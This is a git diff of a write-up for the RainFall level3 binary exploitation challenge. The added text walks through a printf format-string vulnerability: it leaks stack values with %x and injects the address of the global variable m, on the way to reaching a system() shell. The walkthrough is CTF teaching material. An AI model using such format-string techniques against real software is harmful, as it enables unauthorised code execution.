@@ -47,7 +47,7 @@ We also find a global variable ```m``` at address 0x804988c.
 ```
 Back in ```v()```, we see a comparison of variable ```m``` to the value 64 (or $0x40 in hexadecimal).<br/>
 If the comparison is not equal (```jne```), then the program quits.<br/>
-If the comparison is true, the program makes a call to ```system()``` and launches a shell. 
+If the comparison is true, the program makes a call to ```system()``` and launches a new shell. 
 ```
    0x080484da <+54>:	mov    0x804988c,%eax
    0x080484df <+59>:	cmp    $0x40,%eax
@@ -56,7 +56,20 @@ If the comparison is true, the program makes a call to ```system()``` and launch
    0x08048513 <+111>:	call   0x80483c0 <system@plt>
    0x08048518 <+116>:	leave
 ```
-pff
+We know that a ```printf()``` string with spurious % specifiers can be used to read whatever is on the stack. 
+Let's try it out. We'll use the modifier ```%x```, which will print out addresses on the stack in hexadecimal.
+```
+level3@RainFall:~$ python -c 'print "AAAA %x %x %x %x %x %x %x"' | ./level3
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
+```
+Interesting... We can see our buffer "AAAA" in the 4th position on the stack as ```41414141```.
+This means that we can leverage ```printf``` to write our variable ```m```'s address, directly in the stack!
+So let's replace our buffer "AAAA" with the address of the variable ```m``` (in little endian).
+```
+level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08'+'%x %x %x %x'" | ./level3
+�200 b7fd1ac0 b7ff37d0 804988c
+```
+
 
 
 
